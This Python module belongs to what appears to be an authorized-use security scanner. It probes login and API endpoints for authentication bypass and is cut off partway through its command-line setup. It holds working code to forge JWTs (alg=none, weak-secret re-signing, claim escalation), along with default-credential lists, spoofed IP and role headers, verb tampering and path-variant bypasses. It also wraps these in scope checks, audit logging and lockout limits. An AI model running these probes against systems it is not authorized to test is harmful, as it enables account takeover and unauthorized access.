"""
creep_auth.py — Phase 2: Auth Bypass & Privilege Escalation Probes
Part of Creep: Defensive Adversarial Security Scanner
Author: Leon Priest
License: Apache 2.0

Active authentication testing module. Probes:
  - JWT attacks (none algorithm, weak secret, alg confusion, expired acceptance)
  - Default / common credential pairs
  - Auth header manipulation (removal, spoofing, forging)
  - HTTP verb tampering (bypass via HEAD/OPTIONS/TRACE)
  - Path normalisation bypass (/admin vs /ADMIN vs /admin/)
  - Mass-assignment / parameter pollution
  - Privilege escalation via role/ID manipulation
  - API key brute hints (common header names, blank keys)

REQUIRES EXPLICIT OPT-IN. Every probe is logged.
Credential lists are intentionally short — this is a hints/pattern
tester, not a full brute-forcer. Rate-limited by default.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Iterator

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from creep_static import Category, Finding, Severity
from creep_gate  import check_scope_url, ScopeError

# Suppress SSL warnings for self-signed certs during testing
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------------------------------------------------------------------------
# Audit log
# ---------------------------------------------------------------------------

_AUDIT_LOG = Path.home() / ".creep" / "auth_audit.jsonl"


def _log_probe(url: str, technique: str, result: str, *, event: str = "result") -> None:
    try:
        _AUDIT_LOG.parent.mkdir(parents=True, exist_ok=True)
        record = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event":     event,
            "url":       url,
            "technique": technique,
            "result":    result,
            "module":    "creep_auth",
        }
        with open(_AUDIT_LOG, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(record) + "\n")
    except OSError:
        pass


# ---------------------------------------------------------------------------
# HTTP session
# ---------------------------------------------------------------------------

def _make_session(timeout: float = 5.0) -> requests.Session:
    s = requests.Session()
    s.mount("http://",  HTTPAdapter(max_retries=Retry(total=0)))
    s.mount("https://", HTTPAdapter(max_retries=Retry(total=0)))
    s.headers["User-Agent"] = "creep-auth/0.1"
    return s


# ---------------------------------------------------------------------------
# JWT toolkit
# ---------------------------------------------------------------------------

def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    pad = 4 - len(s) % 4
    return base64.urlsafe_b64decode(s + "=" * pad)


def _parse_jwt(token: str) -> tuple[dict, dict, str] | None:
    """Split JWT into (header, payload, signature). Returns None if malformed."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def _forge_jwt_none_alg(token: str) -> str | None:
    """
    'none' algorithm attack: strip signature, set alg=none.
    CVE class: JWT libraries that accept unsigned tokens.
    """
    parsed = _parse_jwt(token)
    if not parsed:
        return None
    _, payload, _ = parsed
    header = {"alg": "none", "typ": "JWT"}
    new_h   = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_p   = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{new_h}.{new_p}."


def _forge_jwt_none_alg_variants(token: str) -> list[tuple[str, str]]:
    """Return multiple none-alg variants (case variations libraries may accept)."""
    parsed = _parse_jwt(token)
    if not parsed:
        return []
    _, payload, _ = parsed
    new_p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    variants = []
    for alg in ("none", "None", "NONE", "nOnE"):
        header  = {"alg": alg, "typ": "JWT"}
        new_h   = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        variants.append((alg, f"{new_h}.{new_p}."))
    return variants


def _forge_jwt_weak_secret(token: str, secrets: list[str]) -> list[tuple[str, str]]:
    """
    Re-sign the JWT with each candidate weak secret.
    Returns list of (secret, forged_token) for secrets that produce valid-looking tokens.
    """
    parsed = _parse_jwt(token)
    if not parsed:
        return []
    header, payload, _ = parsed

    # Only applies to HS256/HS384/HS512
    alg = header.get("alg", "")
    if not alg.startswith("HS"):
        return []

    hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    hash_fn  = hash_map.get(alg, hashlib.sha256)

    results = []
    new_h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{new_h}.{new_p}".encode()

    for secret in secrets:
        sig = hmac.new(secret.encode(), signing_input, hash_fn).digest()
        forged = f"{new_h}.{new_p}.{_b64url_encode(sig)}"
        results.append((secret, forged))

    return results


def _forge_jwt_escalate(token: str, escalations: dict) -> str | None:
    """
    Modify JWT payload claims for privilege escalation.
    e.g. {"role": "admin", "is_admin": true, "user_id": 1}
    """
    parsed = _parse_jwt(token)
    if not parsed:
        return None
    header, payload, sig = parsed
    new_payload = {**payload, **escalations}
    new_h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_p = _b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode())
    # Keep original signature — tests if server validates
    return f"{new_h}.{new_p}.{sig}"


# Common weak JWT secrets
_WEAK_JWT_SECRETS = [
    "secret", "password", "123456", "changeme", "qwerty",
    "admin", "letmein", "jwt_secret", "your-256-bit-secret",
    "supersecret", "mysecret", "test", "dev", "development",
    "production", "key", "private", "token", "api_secret",
    "app_secret", "flask_secret", "django_secret", "secret_key",
    "", "null", "undefined",
]

# Privilege escalation claim mutations
_ESCALATION_MUTATIONS: list[dict] = [
    {"role": "admin"},
    {"role": "superadmin"},
    {"role": "root"},
    {"is_admin": True},
    {"is_superuser": True},
    {"admin": True},
    {"scope": "admin"},
    {"permissions": ["admin", "read", "write", "delete"]},
    {"user_id": 1},
    {"id": 1},
    {"sub": "admin"},
    {"sub": "1"},
    {"groups": ["admin", "staff"]},
    {"level": 0},
    {"tier": "premium"},
]


# ---------------------------------------------------------------------------
# Default credential pairs
# ---------------------------------------------------------------------------

# (username, password) pairs — common defaults only, not a brute list
_DEFAULT_CREDS: list[tuple[str, str]] = [
    ("admin",     "admin"),
    ("admin",     "password"),
    ("admin",     "123456"),
    ("admin",     ""),
    ("root",      "root"),
    ("root",      "password"),
    ("root",      ""),
    ("user",      "user"),
    ("user",      "password"),
    ("test",      "test"),
    ("guest",     "guest"),
    ("demo",      "demo"),
    ("admin",     "changeme"),
    ("admin",     "letmein"),
    ("admin",     "admin123"),
    ("operator",  "operator"),
    ("service",   "service"),
    ("api",       "api"),
    ("apikey",    "apikey"),
    ("ollama",    "ollama"),
]

# Common API key header names to probe with blank / dummy values
_API_KEY_HEADERS: list[str] = [
    "X-API-Key", "X-Api-Key", "X-API-TOKEN", "X-Auth-Token",
    "Authorization", "Api-Key", "Token", "X-Token",
    "X-Access-Token", "X-Secret-Key", "X-Application-Key",
]

# Auth header spoof values
_SPOOF_HEADERS: list[tuple[str, str]] = [
    ("X-Forwarded-For",       "127.0.0.1"),
    ("X-Real-IP",             "127.0.0.1"),
    ("X-Originating-IP",      "127.0.0.1"),
    ("X-Remote-IP",           "127.0.0.1"),
    ("X-Remote-Addr",         "127.0.0.1"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("X-Forward-For",         "127.0.0.1"),
    ("True-Client-IP",        "127.0.0.1"),
    ("Client-IP",             "127.0.0.1"),
    ("Forwarded",             "for=127.0.0.1"),
    ("X-Host",                "localhost"),
    ("X-Forwarded-Host",      "localhost"),
    ("X-Original-URL",        "/admin"),
    ("X-Rewrite-URL",         "/admin"),
    ("X-Admin",               "true"),
    ("X-Role",                "admin"),
    ("X-User-Role",           "admin"),
    ("X-Is-Admin",            "1"),
    ("X-Privileged",          "true"),
]

# HTTP verb tampering candidates
_VERB_TAMPERS: list[str] = [
    "HEAD", "OPTIONS", "TRACE", "CONNECT",
    "GET", "POST", "PUT", "PATCH",
    "ARBITRARY", "FAKE",           # some frameworks skip auth on unknown verbs
]

# Path normalisation bypass variants (applied as suffix/prefix mutations)
def _path_variants(path: str) -> list[tuple[str, str]]:
    """Generate path normalisation bypass variants."""
    variants = []
    base = path.rstrip("/")
    # Case variations (for case-insensitive routers)
    variants.append(("uppercase",    base.upper()))
    variants.append(("mixed_case",   base.swapcase()))
    # Trailing slash
    variants.append(("trailing_slash", base + "/"))
    # Double slash
    variants.append(("double_slash",  base.replace("/", "//")))
    # URL encoding
    encoded = base.replace("/", "%2F")
    variants.append(("url_encoded_slash", encoded))
    # Dot segments
    variants.append(("dot_segment",  base + "/./"))
    variants.append(("double_dot",   base + "/../" + base.split("/")[-1]))
    # Null byte (some parsers strip at \x00)
    variants.append(("null_suffix",  base + "%00"))
    variants.append(("null_ext",     base + "%00.html"))
    # Extension spoofing
    variants.append(("json_ext",     base + ".json"))
    variants.append(("html_ext",     base + ".html"))
    variants.append(("php_ext",      base + ".php"))
    return variants


# ---------------------------------------------------------------------------
# Probe result
# ---------------------------------------------------------------------------

@dataclass
class AuthResult:
    url:         str
    technique:   str
    description: str
    status:      int | None
    baseline:    int | None
    bypassed:    bool = False          # True if response suggests auth bypass
    evidence:    str  = ""
    detail:      str  = ""


# ---------------------------------------------------------------------------
# Core probers
# ---------------------------------------------------------------------------

def _get_baseline(
    session: requests.Session,
    url:     str,
    headers: dict | None = None,
    timeout: float = 5.0,
) -> int | None:
    _log_probe(url, "baseline", "attempted", event="attempted")
    try:
        r = session.get(url, headers=headers or {}, timeout=timeout,
                        verify=False, allow_redirects=False)
        _log_probe(url, "baseline", str(r.status_code), event="result")
        return r.status_code
    except Exception:
        _log_probe(url, "baseline", "error", event="result")
        return None


def _probe_request(
    session:  requests.Session,
    method:   str,
    url:      str,
    headers:  dict,
    body:     dict | str | None,
    timeout:  float,
) -> tuple[int | None, str]:
    """Send one auth probe. Returns (status, response_snippet)."""
    # Audit before traffic goes out
    _log_probe(url, "pre-request", "attempted", event="attempted")
    try:
        kwargs: dict = dict(
            headers=headers,
            timeout=timeout,
            verify=False,
            allow_redirects=False,
        )
        if body is not None:
            if isinstance(body, dict):
                kwargs["json"] = body
            else:
                kwargs["data"] = body

        r = session.request(method.upper(), url, **kwargs)
        return r.status_code, r.text[:300]
    except Exception as e:
        return None, str(e)[:100]


def _is_bypass(status: int | None, baseline: int | None) -> bool:
    """
    Heuristic: bypass likely if:
    - We went from 401/403 to 200/201/302
    - We got 200 where server previously demanded auth
    """
    if status is None or baseline is None:
        return False
    was_blocked = baseline in (401, 403, 407)
    now_allowed = status in (200, 201, 202, 204, 301, 302, 307)
    return was_blocked and now_allowed


# ---------------------------------------------------------------------------
# JWT attack suite
# ---------------------------------------------------------------------------

def probe_jwt(
    url:         str,
    token:       str,
    *,
    method:      str   = "GET",
    auth_header: str   = "Authorization",
    auth_prefix: str   = "Bearer ",
    timeout:     float = 5.0,
    delay:       float = 0.1,
    progress_cb=None,
) -> list[AuthResult]:
    """
    Run a full JWT attack suite against a protected endpoint.

    Args:
        url:         Endpoint to probe.
        token:       A valid (or captured) JWT token to mutate.
        method:      HTTP method to use.
        auth_header: Header name for the token (default: Authorization).
        auth_prefix: Prefix before token value (default: 'Bearer ').
        timeout:     Per-request timeout.
        delay:       Delay between probes.
        progress_cb: Optional callable(msg: str).
    """
    def _log(msg: str) -> None:
        if progress_cb:
            progress_cb(msg)

    session  = _make_session(timeout)
    results: list[AuthResult] = []

    # Baseline with valid token
    baseline = _get_baseline(
        session, url,
        headers={auth_header: f"{auth_prefix}{token}"},
        timeout=timeout,
    )
    _log(f"  JWT baseline (valid token) → {baseline}")

    # Baseline without token
    no_auth_baseline = _get_baseline(session, url, timeout=timeout)
    _log(f"  JWT baseline (no token)    → {no_auth_baseline}")

    # ── 1. None algorithm ────────────────────────────────────────────
    for alg, forged in _forge_jwt_none_alg_variants(token):
        status, snippet = _probe_request(
            session, method, url,
            headers={auth_header: f"{auth_prefix}{forged}"},
            body=None, timeout=timeout,
        )
        bypassed = _is_bypass(status, no_auth_baseline) or status == baseline
        _log_probe(url, f"jwt_none_alg({alg})", str(status))
        results.append(AuthResult(
            url=url, technique=f"jwt_none_alg ({alg})",
            description=f"JWT 'none' algorithm bypass (alg={alg})",
            status=status, baseline=no_auth_baseline,
            bypassed=bypassed,
            evidence=f"forged token accepted | status={status}",
            detail="Some JWT libraries accept tokens with alg=none, skipping signature verification.",
        ))
        time.sleep(delay)

    # ── 2. Weak secret brute ─────────────────────────────────────────
    _log(f"  Trying {len(_WEAK_JWT_SECRETS)} weak JWT secrets…")
    for secret, forged in _forge_jwt_weak_secret(token, _WEAK_JWT_SECRETS):
        status, snippet = _probe_request(
            session, method, url,
            headers={auth_header: f"{auth_prefix}{forged}"},
            body=None, timeout=timeout,
        )
        bypassed = status == baseline
        _log_probe(url, f"jwt_weak_secret({secret!r})", str(status))
        if bypassed:
            results.append(AuthResult(
                url=url, technique="jwt_weak_secret",
                description=f"JWT signed with weak secret: {secret!r}",
                status=status, baseline=baseline,
                bypassed=True,
                evidence=f"secret=[REDACTED len={len(secret)}] | server accepted re-signed token",
                detail="Weak HMAC secret allows full token forgery. Any user can escalate.",
            ))
            _log(f"  [!] WEAK SECRET FOUND (len={len(secret)}) — see report for detail")
        time.sleep(delay)

    # ── 3. Privilege escalation (tampered claims) ────────────────────
    _log(f"  Trying {len(_ESCALATION_MUTATIONS)} claim escalation mutations…")
    for mutation in _ESCALATION_MUTATIONS:
        forged = _forge_jwt_escalate(token, mutation)
        if not forged:
            continue
        status, snippet = _probe_request(
            session, method, url,
            headers={auth_header: f"{auth_prefix}{forged}"},
            body=None, timeout=timeout,
        )
        bypassed = _is_bypass(status, no_auth_baseline) or (
            status == baseline and status not in (401, 403)
        )
        _log_probe(url, f"jwt_claim_escalation({mutation})", str(status))
        if bypassed:
            results.append(AuthResult(
                url=url, technique="jwt_claim_escalation",
                description=f"JWT claim escalation accepted: {mutation}",
                status=status, baseline=no_auth_baseline,
                bypassed=True,
                evidence=f"mutation={mutation} | status={status}",
                detail="Server accepted a JWT with modified privilege claims without validating the signature.",
            ))
        time.sleep(delay)

    # ── 4. Expired token acceptance ──────────────────────────────────
    parsed = _parse_jwt(token)
    if parsed:
        header, payload, _ = parsed
        if "exp" in payload:
            old_payload = {**payload, "exp": 1000000}  # Unix epoch 1970+11days
            new_h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
            new_p = _b64url_encode(json.dumps(old_payload, separators=(",", ":")).encode())
            expired_token = f"{new_h}.{new_p}."   # none-sig
            status, _ = _probe_request(
                session, method, url,
                headers={auth_header: f"{auth_prefix}{expired_token}"},
                body=None, timeout=timeout,
            )
            bypassed = status not in (401, 403, None)
            _log_probe(url, "jwt_expired_acceptance", str(status))
            results.append(AuthResult(
                url=url, technique="jwt_expired_acceptance",
                description="Expired JWT token accepted",
                status=status, baseline=no_auth_baseline,
                bypassed=bypassed,
                evidence=f"token exp=1000000 | status={status}",
                detail="Server accepted a token with an expiry timestamp far in the past.",
            ))
            time.sleep(delay)

    return results


# ---------------------------------------------------------------------------
# Default credential probe
# ---------------------------------------------------------------------------

def probe_default_creds(
    url:               str,
    *,
    login_field:       str   = "username",
    pass_field:        str   = "password",
    method:            str   = "POST",
    as_json:           bool  = True,
    timeout:           float = 5.0,
    delay:             float = 0.2,
    max_attempts:      int   = 10,
    lockout_threshold: int   = 5,
    progress_cb=None,
) -> list[AuthResult]:
    """
    Try default credential pairs against a login endpoint.
    Detects success by status code shift (200/302 from 401/403/422).

    Safety args:
        max_attempts:      Hard cap on total attempts regardless of list size.
                           Default 10 — well under typical lockout policies.
        lockout_threshold: Stop if this many consecutive 429/locked responses
                           are received, or if a Retry-After header appears.
                           Default 5.
    """
    def _log(msg: str) -> None:
        if progress_cb:
            progress_cb(msg)

    session  = _make_session(timeout)
    results: list[AuthResult] = []

    baseline = _get_baseline(session, url, timeout=timeout)
    _log(f"  Cred probe baseline → {baseline}")

    # Clamp list to max_attempts
    creds_to_try = _DEFAULT_CREDS[:max_attempts]
    _log(f"  Trying {len(creds_to_try)} of {len(_DEFAULT_CREDS)} credential pair(s) "
         f"(max_attempts={max_attempts}, lockout_threshold={lockout_threshold})")

    consecutive_blocks = 0   # tracks consecutive lockout-signal responses

    for username, password in creds_to_try:
        body   = {login_field: username, pass_field: password}
        resp_obj = None
        status   = None
        snippet  = ""

        _log_probe(url, f"default_creds(username={username!r}, password=[REDACTED])", "attempted", event="attempted")

        try:
            if as_json:
                resp_obj = session.post(
                    url,
                    json=body,
                    headers={"Content-Type": "application/json"},
                    timeout=timeout,
                    verify=False,
                    allow_redirects=False,
                )
            else:
                resp_obj = session.post(
                    url, data=body,
                    timeout=timeout,
                    verify=False,
                    allow_redirects=False,
                )
            status  = resp_obj.status_code
            snippet = resp_obj.text[:300]
        except Exception as e:
            status, snippet = None, str(e)

        _log_probe(url, f"default_creds(username={username!r}, password=[REDACTED])", str(status), event="result")

        # ── Lockout signal detection ──────────────────────────────────
        lockout_signal = False

        if status == 429:
            lockout_signal = True
            _log(f"  [!] 429 Too Many Requests — lockout detected")

        if resp_obj is not None:
            retry_after = resp_obj.headers.get("Retry-After", "")
            if retry_after:
                lockout_signal = True
                _log(f"  [!] Retry-After header: {retry_after} — lockout detected")

        # Some services return 403 on lockout (not 429)
        lockout_body_hints = ("locked", "too many", "blocked", "banned",
                              "temporarily", "account suspended")
        if status == 403 and any(h in snippet.lower() for h in lockout_body_hints):
            lockout_signal = True
            _log(f"  [!] 403 with lockout language in body — possible lockout")

        if lockout_signal:
            consecutive_blocks += 1
            if consecutive_blocks >= lockout_threshold:
                _log(
                    f"  [STOP] {consecutive_blocks} consecutive lockout signal(s) — "
                    f"stopping cred probe to protect account. "
                    f"Attempted {len(results)} pair(s) before lockout."
                )
                results.append(AuthResult(
                    url=url, technique="default_creds_lockout_detected",
                    description="Credential probe stopped — lockout signals detected",
                    status=status, baseline=baseline, bypassed=False,
                    evidence=f"Stopped after {consecutive_blocks} consecutive block response(s)",
                    detail=(
                        "Creep detected repeated 429/lockout responses and halted the "
                        "credential probe to avoid locking out accounts. "
                        "This itself indicates the endpoint has brute-force protection."
                    ),
                ))
                break
        else:
            consecutive_blocks = 0   # reset on any non-lockout response

        # ── Success detection ─────────────────────────────────────────
        success = (
            status in (200, 201, 202, 302, 307)
            and baseline not in (200, 201)
        )
        if success:
            results.append(AuthResult(
                url=url, technique="default_credentials",
                description=f"Default credentials accepted: {username}/[REDACTED]",
                status=status, baseline=baseline,
                bypassed=True,
                evidence=f"username={username!r} password=[REDACTED] | status={status}",
                detail="Service accepted a well-known default credential pair.",
            ))
            _log(f"  [!] DEFAULT CREDS ACCEPTED: {username}/[REDACTED]")

        time.sleep(delay)

    return results


# ---------------------------------------------------------------------------
# Header manipulation probes
# ---------------------------------------------------------------------------

def probe_header_bypass(
    url:        str,
    *,
    method:     str   = "GET",
    timeout:    float = 5.0,
    delay:      float = 0.05,
    progress_cb=None,
) -> list[AuthResult]:
    """
    Try IP spoofing / role-injection / internal-host headers
    to bypass auth or access controls.
    """
    def _log(msg: str) -> None:
        if progress_cb:
            progress_cb(msg)

    session  = _make_session(timeout)
    results: list[AuthResult] = []

    baseline = _get_baseline(session, url, timeout=timeout)
    _log(f"  Header bypass baseline → {baseline}")
    _log(f"  Trying {len(_SPOOF_HEADERS)} spoof header(s)…")

    for header_name, header_value in _SPOOF_HEADERS:
        status, snippet = _probe_request(
            session, method, url,
            headers={header_name: header_value},
            body=None, timeout=timeout,
        )
        bypassed = _is_bypass(status, baseline)
        _log_probe(url, f"header_spoof({header_name})", str(status))

        if bypassed:
            results.append(AuthResult(
                url=url, technique="header_bypass",
                description=f"Auth bypassed via header: {header_name}: {header_value}",
                status=status, baseline=baseline,
                bypassed=True,
                evidence=f"{header_name}: {header_value} | {baseline} → {status}",
                detail=(
                    f"Setting '{header_name}: {header_value}' changed the response "
                    f"from HTTP {baseline} to HTTP {status}. "
                    "The server may trust client-supplied IP or role headers."
                ),
            ))
            _log(f"  [!] HEADER BYPASS: {header_name}: {header_value}")

        time.sleep(delay)

    # ── Blank API key headers ────────────────────────────────────────
    _log(f"  Trying {len(_API_KEY_HEADERS)} blank API key header(s)…")
    for header_name in _API_KEY_HEADERS:
        for key_val in ("", "null", "undefined", "0", "true", "Bearer"):
            status, snippet = _probe_request(
                session, method, url,
                headers={header_name: key_val},
                body=None, timeout=timeout,
            )
            bypassed = _is_bypass(status, baseline)
            _log_probe(url, f"blank_api_key({header_name}={key_val!r})", str(status))
            if bypassed:
                results.append(AuthResult(
                    url=url, technique="blank_api_key",
                    description=f"Auth bypassed with blank/null API key: {header_name}",
                    status=status, baseline=baseline,
                    bypassed=True,
                    evidence=f"{header_name}: [REDACTED] | {baseline} → {status}",
                    detail="Server accepted a blank or null API key value.",
                ))
            time.sleep(delay * 0.5)

    return results


# ---------------------------------------------------------------------------
# HTTP verb tampering
# ---------------------------------------------------------------------------

def probe_verb_tamper(
    url:        str,
    *,
    timeout:    float = 5.0,
    delay:      float = 0.05,
    progress_cb=None,
) -> list[AuthResult]:
    """
    Try different HTTP methods on a protected resource.
    Some frameworks only apply auth middleware to GET/POST and skip others.
    Also probes X-HTTP-Method-Override tunnelling.
    """
    def _log(msg: str) -> None:
        if progress_cb:
            progress_cb(msg)

    session  = _make_session(timeout)
    results: list[AuthResult] = []

    baseline = _get_baseline(session, url, timeout=timeout)
    _log(f"  Verb tamper baseline (GET) → {baseline}")

    for verb in _VERB_TAMPERS:
        _log_probe(url, f"verb_tamper({verb})", "attempted", event="attempted")
        try:
            r = session.request(
                verb, url, timeout=timeout, verify=False, allow_redirects=False,
            )
            status = r.status_code
        except Exception:
            status = None

        bypassed = _is_bypass(status, baseline)
        _log_probe(url, f"verb_tamper({verb})", str(status), event="result")

        if bypassed:
            results.append(AuthResult(
                url=url, technique="verb_tampering",
                description=f"Auth bypassed via HTTP verb: {verb}",
                status=status, baseline=baseline,
                bypassed=True,
                evidence=f"Method={verb} | {baseline} → {status}",
                detail=(
                    f"HTTP {verb} returned {status} where GET returns {baseline}. "
                    "Auth middleware may not cover all HTTP methods."
                ),
            ))
            _log(f"  [!] VERB BYPASS: {verb} → {status}")

        time.sleep(delay)

    # ── X-HTTP-Method-Override tunnelling ───────────────────────────
    for override_header in ("X-HTTP-Method-Override", "X-Method-Override",
                             "X-HTTP-Method", "_method"):
        for target_verb in ("DELETE", "PUT", "PATCH", "ADMIN"):
            _log_probe(url, f"method_override({override_header}={target_verb})", "attempted", event="attempted")
            try:
                r = session.get(
                    url,
                    headers={override_header: target_verb},
                    timeout=timeout, verify=False, allow_redirects=False,
                )
                status = r.status_code
            except Exception:
                status = None
            _log_probe(url, f"method_override({override_header}={target_verb})", str(status), event="result")
            bypassed = _is_bypass(status, baseline)
            if bypassed:
                results.append(AuthResult(
                    url=url, technique="method_override",
                    description=f"Method override header accepted: {override_header}: {target_verb}",
                    status=status, baseline=baseline,
                    bypassed=True,
                    evidence=f"{override_header}: {target_verb} | {baseline} → {status}",
                    detail="Server honoured a method-override header, potentially bypassing verb-specific auth.",
                ))
            time.sleep(delay * 0.5)

    return results


# ---------------------------------------------------------------------------
# Path normalisation bypass
# ---------------------------------------------------------------------------

def probe_path_bypass(
    base_url:    str,
    path:        str,
    *,
    timeout:     float = 5.0,
    delay:       float = 0.05,
    progress_cb=None,
) -> list[AuthResult]:
    """
    Try normalisation bypass variants of a protected path.
    e.g. /admin → /ADMIN, /admin/, /admin%00, /admin.json, etc.
    """
    def _log(msg: str) -> None:
        if progress_cb:
            progress_cb(msg)

    session  = _make_session(timeout)
    results: list[AuthResult] = []

    canonical_url = base_url.rstrip("/") + "/" + path.lstrip("/")
    baseline      = _get_baseline(session, canonical_url, timeout=timeout)
    _log(f"  Path bypass baseline ({path}) → {baseline}")

    for name, variant_path in _path_variants(path):
        variant_url = base_url.rstrip("/") + "/" + variant_path.lstrip("/")
        status, _   = _probe_request(
            session, "GET", variant_url,
            headers={}, body=None, timeout=timeout,
        )
        bypassed = _is_bypass(status, baseline)
        _log_probe(variant_url, f"path_bypass({name})", str(status))

        if bypassed:
            results.append(AuthResult(
                url=variant_url, technique="path_normalisation_bypass",
                description=f"Auth bypassed via path variant: {name}",
                status=status, baseline=baseline,
                bypassed=True,
                evidence=f"variant={variant_path!r} | {baseline} → {status}",
                detail=(
                    f"Path variant '{variant_path}' ({name}) returned {status} "
                    f"where canonical path returned {baseline}. "
                    "Router or auth middleware may not normalise paths consistently."
                ),
            ))
            _log(f"  [!] PATH BYPASS ({name}): {variant_path} → {status}")

        time.sleep(delay)

    return results


# ---------------------------------------------------------------------------
# Findings generator
# ---------------------------------------------------------------------------

def _results_to_findings(results: list[AuthResult], target: str) -> list[Finding]:
    findings: list[Finding] = []

    technique_map: dict[str, tuple[Severity, str]] = {
        "jwt_none_alg":               (Severity.CRITICAL, "JWT 'none' algorithm bypass"),
        "jwt_weak_secret":            (Severity.CRITICAL, "JWT weak secret — full token forgery possible"),
        "jwt_claim_escalation":       (Severity.HIGH,     "JWT claim tampering accepted without signature check"),
        "jwt_expired_acceptance":     (Severity.HIGH,     "Expired JWT tokens accepted"),
        "default_credentials":        (Severity.CRITICAL, "Default credentials accepted"),
        "header_bypass":              (Severity.HIGH,     "Auth bypass via HTTP header spoofing"),
        "blank_api_key":              (Severity.CRITICAL, "Blank/null API key accepted"),
        "verb_tampering":             (Severity.HIGH,     "Auth bypass via HTTP verb tampering"),
        "method_override":            (Severity.HIGH,     "Auth bypass via method-override header"),
        "path_normalisation_bypass":  (Severity.HIGH,     "Auth bypass via path normalisation"),
    }

    bypassed = [r for r in results if r.bypassed]
    for r in bypassed:
        # Match technique prefix
        sev, title = Severity.HIGH, r.technique
        for key, (s, t) in technique_map.items():
            if key in r.technique:
                sev, title = s, t
                break

        findings.append(Finding(
            severity=sev,
            category=Category.AUTH,
            target=target,
            title=title,
            detail=r.detail,
            evidence=r.evidence,
            module="auth",
        ))

    findings.sort(key=lambda f: f.severity.rank)
    return findings


# ---------------------------------------------------------------------------
# Top-level entry point
# ---------------------------------------------------------------------------

def run_auth_scan(
    target_url:        str,
    *,
    jwt_token:         str | None = None,
    login_url:         str | None = None,
    protected_paths:   list[str] | None = None,
    timeout:           float = 5.0,
    delay:             float = 0.1,
    max_attempts:      int   = 10,
    lockout_threshold: int   = 5,
    authorized:        bool  = False,
    allow_public:      bool  = False,
    scope:             dict | None = None,
    progress_cb=None,
) -> tuple[list[AuthResult], list[Finding]]:
    """
    Run the full Phase 2 auth probe suite.

    Args:
        target_url:        Base URL or specific protected endpoint.
        jwt_token:         A captured JWT to attack (enables JWT suite).
        login_url:         Login endpoint for default cred probing.
        protected_paths:   List of paths to probe for bypass
                           (e.g. [\'/admin\', \'/api/admin/users\']).
        timeout:           Per-request timeout.
        delay:             Delay between probes.
        max_attempts:      Hard cap on credential attempts (default 10).
                           Keeps Creep well under typical lockout thresholds.
        lockout_threshold: Stop cred probing after this many consecutive
                           429/lockout responses (default 5).
        progress_cb:       Optional callable(msg: str).

    Returns:
        (all_results, findings)
    """
    def _log(msg: str) -> None:
        if progress_cb:
            progress_cb(msg)

    all_results:  list[AuthResult] = []
    all_findings: list[Finding]    = []

    # ── Scope gate ────────────────────────────────────────────
    check_scope_url(target_url, authorized=authorized,
                    allow_public=allow_public, scope=scope, module="auth")
    if login_url:
        check_scope_url(login_url, authorized=authorized,
                        allow_public=allow_public, scope=scope, module="auth")

    # JWT suite
    if jwt_token:
        _log(f"\n\u2500\u2500 JWT attack suite on {target_url} \u2500\u2500\u2500\u2500\u2500\u2500")
        jwt_results = probe_jwt(
            target_url, jwt_token,
            timeout=timeout, delay=delay, progress_cb=progress_cb,
        )
        all_results.extend(jwt_results)
        all_findings.extend(_results_to_findings(jwt_results, target_url))

    # Default credentials
    if login_url:
        _log(f"\n\u2500\u2500 Default credential probe on {login_url} \u2500\u2500\u2500\u2500")
        _log(f"  max_attempts={max_attempts}  lockout_threshold={lockout_threshold}")
        cred_results = probe_default_creds(
            login_url,
            timeout=timeout,
            delay=delay,
            max_attempts=max_attempts,
            lockout_threshold=lockout_threshold,
            progress_cb=progress_cb,
        )
        all_results.extend(cred_results)
        all_findings.extend(_results_to_findings(cred_results, login_url))

    # Header bypass + verb tamper on main target
    _log(f"\n\u2500\u2500 Header bypass on {target_url} \u2500\u2500\u2500\u2500\u2500")
    header_results = probe_header_bypass(
        target_url,
        timeout=timeout, delay=delay, progress_cb=progress_cb,
    )
    all_results.extend(header_results)
    all_findings.extend(_results_to_findings(header_results, target_url))

    _log(f"\n\u2500\u2500 Verb tamper on {target_url} \u2500\u2500\u2500\u2500\u2500\u2500\u2500")
    verb_results = probe_verb_tamper(
        target_url,
        timeout=timeout, delay=delay, progress_cb=progress_cb,
    )
    all_results.extend(verb_results)
    all_findings.extend(_results_to_findings(verb_results, target_url))

    # Path bypass on protected paths
    if protected_paths:
        base = target_url.rstrip("/")
        for path in protected_paths:
            _log(f"\n\u2500\u2500 Path bypass on {path} \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500")
            path_results = probe_path_bypass(
                base, path,
                timeout=timeout, delay=delay, progress_cb=progress_cb,
            )
            all_results.extend(path_results)
            all_findings.extend(_results_to_findings(path_results, f"{base}{path}"))

    all_findings.sort(key=lambda f: f.severity.rank)
    return all_results, all_findings


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="Creep Auth Bypass Prober — direct entry",
        epilog="Only probe systems you own or have written permission to test.",
    )
    parser.add_argument("target",      help="Base URL to probe (e.g. http://localhost:8000/api/admin)")
    parser.add_argument("jwt_token",   nargs="?", default=None, help="JWT token to attack (optional)")
